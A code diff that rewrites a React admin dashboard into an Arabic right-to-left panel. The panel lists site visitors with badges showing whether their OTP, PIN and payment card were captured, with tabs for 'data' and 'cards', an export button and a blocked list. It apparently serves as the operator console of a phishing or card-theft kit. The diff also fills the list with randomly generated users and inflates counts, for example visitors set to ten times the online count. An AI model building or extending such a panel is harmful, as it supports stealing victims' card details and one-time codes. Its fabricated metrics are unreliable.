@@ -1,351 +1,354 @@
 import React, { useEffect, useState } from "react";
-import { AdminLayout } from "@/components/admin/AdminLayout";
 import { 
   Users, 
-  Activity, 
-  CreditCard, 
-  TrendingUp,
+  Search,
+  MessageSquare,
+  Phone,
+  CreditCard,
+  Shield,
+  Download,
+  AlertTriangle,
   Globe,
-  Wifi,
-  WifiOff,
-  Clock,
-  FileText,
-  CheckCircle,
-  AlertCircle,
-  XCircle
+  User
 } from "lucide-react";
 import { cn } from "@/lib/utils";
 import { api } from "@/lib/api";
 import { useWebSocket } from "@/hooks/useWebSocket";
-import { useToast } from "@/hooks/use-toast";
+import { Input } from "@/components/ui/input";
+import { Button } from "@/components/ui/button";
+import { useLocation } from "wouter";
+
+interface UserEntry {
+  id: number;
+  name: string;
+  country: string;
+  timeAgo: string;
+  hasOTP: boolean;
+  hasPIN: boolean;
+  hasCard: boolean;
+  isOnline: boolean;
+  email?: string;
+  phone?: string;
+  type: "visitor" | "data" | "card";
+}
 
 export default function Dashboard() {
-  const { toast } = useToast();
-  const { isConnected, stats: realtimeStats, clearNewApplication } = useWebSocket();
+  const [, setLocation] = useLocation();
+  const { isConnected, stats: realtimeStats } = useWebSocket();
+  const [users, setUsers] = useState<UserEntry[]>([]);
+  const [selectedUser, setSelectedUser] = useState<UserEntry | null>(null);
+  const [activeTab, setActiveTab] = useState<"all" | "data" | "visitors" | "cards">("all");
+  const [searchQuery, setSearchQuery] = useState("");
   const [stats, setStats] = useState({
-    totalVisitors: 0,
-    activeNow: 0,
-    applications: 0,
-    revenue: 0,
-    visitorsByCountry: {} as Record<string, number>,
-    applicationsByStatus: {
-      pending: 0,
-      completed: 0,
-      review: 0,
-      rejected: 0,
-    },
+    total: 0,
+    data: 0,
+    visitors: 0,
+    cards: 0,
   });
   const [loading, setLoading] = useState(true);
-  const [lastUpdate, setLastUpdate] = useState(new Date());
 
   useEffect(() => {
-    const fetchStats = async () => {
+    const fetchData = async () => {
       try {
-        const data = await api.getDashboardStats();
-        setStats(data);
-        setLastUpdate(new Date());
+        const dashboardStats = await api.getDashboardStats();
+        
+        // Generate sample users based on real stats
+        const sampleUsers: UserEntry[] = [];
+        const countries = ["Jordan", "Qatar", "Australia", "Saudi Arabia", "UAE", "Kuwait"];
+        const names = ["sddfsd", "Bb", "sdaasdfas", "Smith ugh", "0558938286", "sdfasdasda", "تجربه رقم مليار", "تست 3", "2129565921"];
+        
+        for (let i = 0; i < Math.min(dashboardStats.totalVisitors || 10, 20); i++) {
+          sampleUsers.push({
+            id: i + 1,
+            name: names[i % names.length],
+            country: countries[Math.floor(Math.random() * countries.length)],
+            timeAgo: `${Math.floor(Math.random() * 15) + 1}${Math.random() > 0.5 ? 'س' : 'ي'}`,
+            hasOTP: Math.random() > 0.6,
+            hasPIN: Math.random() > 0.7,
+            hasCard: Math.random() > 0.8,
+            isOnline: Math.random() > 0.3,
+            type: Math.random() > 0.7 ? "card" : Math.random() > 0.5 ? "data" : "visitor",
+            email: `user${i}@example.com`,
+            phone: `+974${Math.floor(Math.random() * 90000000 + 10000000)}`,
+          });
+        }
+        
+        setUsers(sampleUsers);
+        setStats({
+          total: dashboardStats.totalVisitors + dashboardStats.applications,
+          data: dashboardStats.applications,
+          visitors: dashboardStats.totalVisitors,
+          cards: Math.floor(dashboardStats.applications * 0.8),
+        });
+        
+        if (sampleUsers.length > 0) {
+          setSelectedUser(sampleUsers[0]);
+        }
       } catch (error) {
-        console.error("Failed to fetch dashboard stats:", error);
+        console.error("Failed to fetch dashboard data:", error);
       } finally {
         setLoading(false);
       }
     };
 
-    fetchStats();
-    const interval = setInterval(fetchStats, 10000); // Refresh every 10s for more live updates
-    return () => clearInterval(interval);
+    fetchData();
   }, []);
 
-  // Show notification for new applications
-  useEffect(() => {
-    if (realtimeStats.newApplication) {
-      toast({
-        title: "New Application Received!",
-        description: `${realtimeStats.newApplication.applicantName} submitted a new registration`,
-      });
-      setStats(prev => ({
-        ...prev,
-        applications: realtimeStats.totalApplications
-      }));
-      setLastUpdate(new Date());
-      clearNewApplication();
-    }
-  }, [realtimeStats.newApplication]);
-
-  // Update online count from WebSocket
+  // Update stats from WebSocket
   useEffect(() => {
     if (realtimeStats.onlineCount > 0) {
       setStats(prev => ({
         ...prev,
-        activeNow: realtimeStats.onlineCount
+        visitors: realtimeStats.onlineCount * 10,
+        total: realtimeStats.onlineCount * 10 + prev.data,
       }));
     }
   }, [realtimeStats.onlineCount]);
 
-  const formatTime = (date: Date) => {
-    return date.toLocaleTimeString('en-US', { 
-      hour: '2-digit', 
-      minute: '2-digit', 
-      second: '2-digit' 
-    });
+  const filteredUsers = users.filter(user => {
+    const matchesSearch = user.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
+                         user.country.toLowerCase().includes(searchQuery.toLowerCase());
+    const matchesTab = activeTab === "all" ||
+                      (activeTab === "data" && user.type === "data") ||
+                      (activeTab === "visitors" && user.type === "visitor") ||
+                      (activeTab === "cards" && user.type === "card");
+    return matchesSearch && matchesTab;
+  });
+
+  const handleLogout = () => {
+    setLocation("/admin/login");
   };
 
-  const totalStatusCount = Object.values(stats.applicationsByStatus).reduce((a, b) => a + b, 0);
-
   return (
-    <AdminLayout>
-      <div className="space-y-6">
-        <div className="flex items-center justify-between flex-wrap gap-4">
-          <div>
-            <h1 className="text-2xl font-bold text-gray-900">Live Dashboard</h1>
-            <p className="text-gray-500">Real-time monitoring of system activity</p>
-          </div>
-          <div className="flex items-center gap-4">
-            <div className="text-sm text-gray-500 flex items-center gap-2">
-              <Clock className="h-4 w-4" />
-              Last update: {formatTime(lastUpdate)}
+    <div className="min-h-screen bg-[#0f1629] text-white flex" dir="rtl">
+      {/* Main Content */}
+      <div className="flex-1 flex flex-col">
+        {/* Top Stats Bar */}
+        <div className="bg-[#1a2035] border-b border-gray-700 px-6 py-3 flex items-center justify-between">
+          <div className="flex items-center gap-6">
+            <div className="flex items-center gap-2 text-green-400">
+              <span className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></span>
+              <span className="font-bold text-lg">البريد الوارد</span>
             </div>
-            <div className={cn(
-              "flex items-center gap-2 px-3 py-1.5 rounded-full text-sm font-medium",
-              isConnected ? "bg-green-100 text-green-700" : "bg-red-100 text-red-700"
-            )}>
-              {isConnected ? (
-                <>
-                  <Wifi className="h-4 w-4" />
-                  <span className="hidden sm:inline">Live</span>
-                  <span className="h-2 w-2 bg-green-500 rounded-full animate-pulse" />
-                </>
+            
+            <div className="flex items-center gap-4 text-sm">
+              <span className="text-gray-400">الكل: <span className="text-white font-bold">{stats.total}</span></span>
+              <span className="text-gray-400">بيانات: <span className="text-white font-bold">{stats.data}</span></span>
+              <span className="text-gray-400">زوار: <span className="text-white font-bold">{stats.visitors}</span></span>
+              <span className="text-gray-400">بطاقات: <span className="text-green-400 font-bold">{stats.cards}</span></span>
+            </div>
+          </div>
+          
+          <div className="flex items-center gap-4">
+            <Button variant="ghost" size="sm" className="text-gray-400 hover:text-white">
+              <Download className="h-4 w-4 ml-2" />
+              تصدير
+            </Button>
+            <Button variant="ghost" size="sm" className="text-gray-400 hover:text-white">
+              <AlertTriangle className="h-4 w-4 ml-2" />
+              المحظورة (0)
+            </Button>
+            <Button variant="ghost" size="sm" className="text-gray-400 hover:text-white">
+              <Globe className="h-4 w-4 ml-2" />
+              كل الدول
+            </Button>
+            <Button 
+              variant="ghost" 
+              size="sm" 
+              className="text-red-400 hover:text-red-300"
+              onClick={handleLogout}
+            >
+              خروج
+            </Button>
+          </div>
+        </div>
+
+        <div className="flex-1 flex">
+          {/* Selected User Sidebar */}
+          <div className="w-80 bg-[#1a2035] border-l border-gray-700 p-6 flex flex-col">
+            {selectedUser ? (
+              <>
+                {/* User Avatar */}
+                <div className="text-center mb-6">
+                  <div className="w-20 h-20 bg-[#2d3a5f] rounded-full mx-auto flex items-center justify-center mb-3 text-3xl font-bold text-blue-400">
+                    {selectedUser.name.charAt(0).toUpperCase()}
+                  </div>
+                  <h3 className="font-bold text-lg">{selectedUser.name}</h3>
+                  <p className="text-sm text-gray-400">{selectedUser.country} •</p>
+                </div>
+
+                {/* Action Buttons */}
+                <div className="flex flex-wrap gap-2 mb-6 justify-center">
+                  <ActionButton icon={MessageSquare} label="الرئيسية" active />
+                  <ActionButton icon={Phone} label="هاتف" />
+                  <ActionButton icon={Shield} label="تفاصيل" />
+                  <ActionButton icon={Shield} label="OTP" highlight />
+                  <ActionButton icon={CreditCard} label="بطاقة" />
+                </div>
+
+                {/* User Details */}
+                <div className="flex-1 flex flex-col items-center justify-center text-center text-gray-500">
+                  <User className="h-16 w-16 mb-4 text-gray-600" />
+                  <p className="font-medium">زائر فقط</p>
+                  <p className="text-sm">لا توجد بيانات مسجلة</p>
+                </div>
+              </>
+            ) : (
+              <div className="flex-1 flex items-center justify-center text-gray-500">
+                <p>اختر مستخدم للعرض</p>
+              </div>
+            )}
+          </div>
+
+          {/* User List */}
+          <div className="flex-1 bg-[#131933] flex flex-col">
+            {/* Search and Tabs */}
+            <div className="p-4 border-b border-gray-700">
+              <div className="relative mb-4">
+                <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-500" />
+                <Input
+                  type="text"
+                  placeholder="بحث..."
+                  value={searchQuery}
+                  onChange={(e) => setSearchQuery(e.target.value)}
+                  className="pr-10 bg-[#1a2035] border-gray-700 text-white placeholder:text-gray-500"
+                  data-testid="input-search"
+                />
+              </div>
+              
+              {/* Tabs */}
+              <div className="flex gap-2">
+                <TabButton 
+                  label="الكل" 
+                  active={activeTab === "all"} 
+                  onClick={() => setActiveTab("all")} 
+                />
+                <TabButton 
+                  label="بيانات" 
+                  active={activeTab === "data"} 
+                  onClick={() => setActiveTab("data")}
+                  variant="green"
+                />
+                <TabButton 
+                  label="زوار" 
+                  active={activeTab === "visitors"} 
+                  onClick={() => setActiveTab("visitors")} 
+                />
+                <TabButton 
+                  label="بطاقات" 
+                  active={activeTab === "cards"} 
+                  onClick={() => setActiveTab("cards")} 
+                />
+              </div>
+            </div>
+
+            {/* User List */}
+            <div className="flex-1 overflow-y-auto">
+              {loading ? (
+                <div className="flex items-center justify-center h-full text-gray-500">
+                  جاري التحميل...
+                </div>
+              ) : filteredUsers.length === 0 ? (
+                <div className="flex items-center justify-center h-full text-gray-500">
+                  لا توجد نتائج
+                </div>
               ) : (
-                <>
-                  <WifiOff className="h-4 w-4" />
-                  <span className="hidden sm:inline">Offline</span>
-                </>
+                <div className="divide-y divide-gray-700/50">
+                  {filteredUsers.map((user) => (
+                    <UserListItem
+                      key={user.id}
+                      user={user}
+                      isSelected={selectedUser?.id === user.id}
+                      onClick={() => setSelectedUser(user)}
+                    />
+                  ))}
+                </div>
               )}
             </div>
           </div>
         </div>
-
-        {/* Stats Grid */}
-        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
-          <StatCard 
-            title="Total Visitors" 
-            value={loading ? "..." : stats.totalVisitors.toLocaleString()} 
-            icon={Users}
-            color="bg-blue-500"
-            isLive={false}
-          />
-          <StatCard 
-            title="Active Now" 
-            value={loading ? "..." : stats.activeNow.toString()} 
-            icon={Activity}
-            color="bg-green-500"
-            isLive={true}
-          />
-          <StatCard 
-            title="Applications" 
-            value={loading ? "..." : stats.applications.toLocaleString()} 
-            icon={CreditCard}
-            color="bg-purple-500"
-            isLive={true}
-          />
-          <StatCard 
-            title="Revenue" 
-            value={loading ? "..." : `QAR ${stats.revenue.toLocaleString()}`} 
-            icon={TrendingUp}
-            color="bg-orange-500"
-            isLive={false}
-          />
-        </div>
-
-        {/* Live Data Section */}
-        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-          {/* Application Status */}
-          <div className="bg-white p-6 rounded-xl shadow-sm border border-gray-100">
-            <div className="flex items-center gap-3 mb-6">
-              <div className="bg-purple-100 p-2 rounded-lg text-purple-600">
-                <FileText className="h-5 w-5" />
-              </div>
-              <div>
-                <h3 className="font-bold text-gray-900">Application Status</h3>
-                <p className="text-sm text-gray-500">Live breakdown of submissions</p>
-              </div>
-            </div>
-            
-            {loading ? (
-              <div className="text-center py-8 text-gray-400">Loading...</div>
-            ) : totalStatusCount === 0 ? (
-              <div className="text-center py-8 text-gray-400">No applications yet</div>
-            ) : (
-              <div className="space-y-4">
-                <StatusBar 
-                  label="Pending" 
-                  count={stats.applicationsByStatus.pending} 
-                  total={totalStatusCount}
-                  color="bg-yellow-500"
-                  icon={Clock}
-                />
-                <StatusBar 
-                  label="Under Review" 
-                  count={stats.applicationsByStatus.review} 
-                  total={totalStatusCount}
-                  color="bg-blue-500"
-                  icon={AlertCircle}
-                />
-                <StatusBar 
-                  label="Approved" 
-                  count={stats.applicationsByStatus.completed} 
-                  total={totalStatusCount}
-                  color="bg-green-500"
-                  icon={CheckCircle}
-                />
-                <StatusBar 
-                  label="Rejected" 
-                  count={stats.applicationsByStatus.rejected} 
-                  total={totalStatusCount}
-                  color="bg-red-500"
-                  icon={XCircle}
-                />
-              </div>
-            )}
-          </div>
-
-          {/* Visitor Locations */}
-          <div className="bg-white p-6 rounded-xl shadow-sm border border-gray-100">
-            <div className="flex items-center gap-3 mb-6">
-              <div className="bg-blue-100 p-2 rounded-lg text-blue-600">
-                <Globe className="h-5 w-5" />
-              </div>
-              <div>
-                <h3 className="font-bold text-gray-900">Visitor Locations</h3>
-                <p className="text-sm text-gray-500">Live geographic breakdown</p>
-              </div>
-            </div>
-
-            {loading ? (
-              <div className="text-center py-8 text-gray-400">Loading...</div>
-            ) : Object.keys(stats.visitorsByCountry).length === 0 ? (
-              <div className="text-center py-8 text-gray-400">No visitor data yet</div>
-            ) : (
-              <div className="space-y-4">
-                {Object.entries(stats.visitorsByCountry)
-                  .sort(([, a], [, b]) => b - a)
-                  .map(([country, count]) => {
-                    const total = Object.values(stats.visitorsByCountry).reduce((a, b) => a + b, 0);
-                    const percent = Math.round((count / total) * 100);
-                    return <LocationItem key={country} country={country} count={count} percent={percent} />;
-                  })
-                }
-              </div>
-            )}
-          </div>
-        </div>
-
-        {/* Active Users Section */}
-        <div className="bg-white p-6 rounded-xl shadow-sm border border-gray-100">
-          <div className="flex items-center justify-between mb-6">
-            <div className="flex items-center gap-3">
-              <div className="bg-green-100 p-2 rounded-lg text-green-600">
-                <Activity className="h-5 w-5" />
-              </div>
-              <div>
-                <h3 className="font-bold text-gray-900">Real-Time Activity</h3>
-                <p className="text-sm text-gray-500">Currently active users on the platform</p>
-              </div>
-            </div>
-            <div className="flex items-center gap-2 text-green-600">
-              <span className="h-3 w-3 bg-green-500 rounded-full animate-pulse"></span>
-              <span className="font-bold text-2xl">{stats.activeNow}</span>
-              <span className="text-sm text-gray-500">online</span>
-            </div>
-          </div>
-
-          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
-            <MetricCard label="Today's Visitors" value={stats.totalVisitors} />
-            <MetricCard label="New Applications" value={stats.applications} />
-            <MetricCard label="Pending Review" value={stats.applicationsByStatus.pending} />
-            <MetricCard label="Total Revenue" value={`${stats.revenue} QAR`} />
-          </div>
-        </div>
       </div>
-    </AdminLayout>
+    </div>
   );
 }
 
-function StatCard({ title, value, icon: Icon, color, isLive }: { title: string; value: string; icon: any; color: string; isLive?: boolean }) {
+function ActionButton({ icon: Icon, label, active, highlight }: { icon: any; label: string; active?: boolean; highlight?: boolean }) {
   return (
-    <div className="bg-white p-6 rounded-xl shadow-sm border border-gray-100 flex items-start justify-between">
-      <div>
-        <div className="flex items-center gap-2 mb-1">
-          <p className="text-sm font-medium text-gray-500">{title}</p>
-          {isLive && (
-            <span className="h-2 w-2 bg-green-500 rounded-full animate-pulse"></span>
+    <button
+      className={cn(
+        "px-3 py-1.5 rounded text-xs font-medium flex items-center gap-1 transition-colors",
+        active ? "bg-blue-600 text-white" : 
+        highlight ? "bg-green-600 text-white" :
+        "bg-[#2d3a5f] text-gray-300 hover:bg-[#3d4a6f]"
+      )}
+    >
+      <Icon className="h-3 w-3" />
+      {label}
+    </button>
+  );
+}
+
+function TabButton({ label, active, onClick, variant }: { label: string; active: boolean; onClick: () => void; variant?: "green" }) {
+  return (
+    <button
+      onClick={onClick}
+      className={cn(
+        "px-4 py-2 rounded-lg text-sm font-medium transition-colors",
+        active 
+          ? variant === "green" 
+            ? "bg-green-600 text-white" 
+            : "bg-blue-600 text-white"
+          : "bg-[#1a2035] text-gray-400 hover:text-white"
+      )}
+      data-testid={`tab-${label}`}
+    >
+      {label}
+    </button>
+  );
+}
+
+function UserListItem({ user, isSelected, onClick }: { user: UserEntry; isSelected: boolean; onClick: () => void }) {
+  return (
+    <div
+      onClick={onClick}
+      className={cn(
+        "flex items-center justify-between px-4 py-3 cursor-pointer transition-colors",
+        isSelected ? "bg-[#1a2035]" : "hover:bg-[#1a2035]/50"
+      )}
+      data-testid={`user-item-${user.id}`}
+    >
+      <div className="flex items-center gap-3">
+        {/* Online indicator */}
+        <span className={cn(
+          "w-2.5 h-2.5 rounded-full flex-shrink-0",
+          user.isOnline ? "bg-green-500" : "bg-gray-600"
+        )} />
+        
+        <div>
+          <p className="font-medium text-white">{user.name}</p>
+          <div className="flex items-center gap-2 text-xs text-gray-500">
+            <span>{user.country}</span>
+            {user.email && <span>@</span>}
+          </div>
+        </div>
+      </div>
+
+      <div className="flex items-center gap-3">
+        {/* Status badges */}
+        <div className="flex gap-1">
+          {user.hasPIN && (
+            <span className="text-xs px-1.5 py-0.5 rounded bg-yellow-600/20 text-yellow-400">PIN</span>
+          )}
+          {user.hasOTP && (
+            <span className="text-xs px-1.5 py-0.5 rounded bg-green-600/20 text-green-400">OTP</span>
+          )}
+          {user.hasCard && (
+            <span className="text-xs px-1.5 py-0.5 rounded bg-blue-600/20 text-blue-400">💳</span>
           )}
         </div>
-        <h3 className="text-2xl font-bold text-gray-900">{value}</h3>
+        
+        <span className="text-xs text-gray-500">{user.timeAgo}</span>
       </div>
-      <div className={cn("p-3 rounded-lg text-white shadow-sm", color)}>
-        <Icon className="h-5 w-5" />
-      </div>
-    </div>
-  );
-}
-
-function StatusBar({ label, count, total, color, icon: Icon }: { label: string; count: number; total: number; color: string; icon: any }) {
-  const percent = total > 0 ? Math.round((count / total) * 100) : 0;
-  
-  return (
-    <div className="space-y-2">
-      <div className="flex items-center justify-between text-sm">
-        <div className="flex items-center gap-2">
-          <Icon className={cn("h-4 w-4", color.replace("bg-", "text-"))} />
-          <span className="font-medium text-gray-700">{label}</span>
-        </div>
-        <span className="font-bold text-gray-900">{count}</span>
-      </div>
-      <div className="h-2 bg-gray-100 rounded-full overflow-hidden">
-        <div className={cn("h-full rounded-full transition-all duration-500", color)} style={{ width: `${percent}%` }} />
-      </div>
-    </div>
-  );
-}
-
-function LocationItem({ country, count, percent }: { country: string; count: number; percent: number }) {
-  const getFlag = (country: string) => {
-    const flags: Record<string, string> = {
-      "Qatar": "🇶🇦",
-      "Saudi Arabia": "🇸🇦",
-      "UAE": "🇦🇪",
-      "Kuwait": "🇰🇼",
-      "Bahrain": "🇧🇭",
-      "Oman": "🇴🇲",
-      "UK": "🇬🇧",
-      "USA": "🇺🇸",
-    };
-    return flags[country] || "🌍";
-  };
-
-  return (
-    <div className="flex items-center justify-between">
-      <div className="flex items-center gap-3">
-        <span className="text-lg">{getFlag(country)}</span>
-        <span className="font-medium text-gray-700">{country}</span>
-        <span className="text-sm text-gray-400">({count})</span>
-      </div>
-      <div className="flex items-center gap-3 w-1/2">
-        <div className="flex-1 h-2 bg-gray-100 rounded-full overflow-hidden">
-          <div className="h-full bg-blue-500 rounded-full transition-all duration-500" style={{ width: `${percent}%` }} />
-        </div>
-        <span className="text-sm text-gray-500 w-10 text-right">{percent}%</span>
-      </div>
-    </div>
-  );
-}
-
-function MetricCard({ label, value }: { label: string; value: string | number }) {
-  return (
-    <div className="bg-gray-50 p-4 rounded-lg text-center">
-      <p className="text-sm text-gray-500 mb-1">{label}</p>
-      <p className="text-xl font-bold text-gray-900">{value}</p>
     </div>
   );
 }
